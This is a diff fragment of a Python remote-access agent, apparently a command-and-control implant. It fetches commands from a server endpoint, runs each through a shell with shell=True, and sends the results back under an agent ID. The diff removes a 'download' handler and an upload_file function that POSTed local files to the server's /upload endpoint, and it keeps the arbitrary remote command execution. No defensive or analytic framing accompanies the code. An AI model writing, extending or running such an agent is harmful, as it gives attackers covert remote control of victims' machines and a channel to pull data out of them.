@@ -10,39 +10,22 @@ COMMAND_ENDPOINT = f'{SERVER_URL}/get_command'  # Adjusted endpoint
 OUTPUT_ENDPOINT = f'{SERVER_URL}/send_output'  # Adjusted endpoint
 
 def execute_command(command):
-    if command.startswith("download "):
-        filename = command.split(" ", 1)[1]  # Extract filename from command
-        upload_file(filename)  # Assume this function uploads a file to the server
-        return f"File {filename} uploaded successfully."
-    else:
-        # Original command execution logic
-        try:
-            result = subprocess.run(
-                command,
-                shell=True,
-                check=True,
-                text=True,
-                capture_output=True
-            )
-            return result.stdout
-        except subprocess.CalledProcessError as e:
-            error_message = f"Error executing command: {e}\n"
-            if hasattr(e, 'stderr') and e.stderr is not None:
-                error_message += f"{e.stderr}\n"
-            return error_message
-        except Exception as e:
-            return f"Error executing command: {e}"
-
-def upload_file(file_path):
-    upload_url = f"{SERVER_URL}/upload"
     try:
-        with open(file_path, 'rb') as f:
-            files = {'file': (os.path.basename(file_path), f)}
-            response = requests.post(upload_url, files=files, data={'agent_id': AGENT_ID})
-            response.raise_for_status()
-        print(f"Uploaded {file_path}")
+        result = subprocess.run(
+            command,
+            shell=True,
+            check=True,
+            text=True,
+            capture_output=True
+        )
+        return result.stdout
+    except subprocess.CalledProcessError as e:
+        error_message = f"Error executing command: {e}\n"
+        if hasattr(e, 'stderr') and e.stderr is not None:
+            error_message += f"{e.stderr}\n"
+        return error_message
     except Exception as e:
-        print(f"Error uploading file: {e}")
+        return f"Error executing command: {e}"
 
 def send_output(output):
     try:
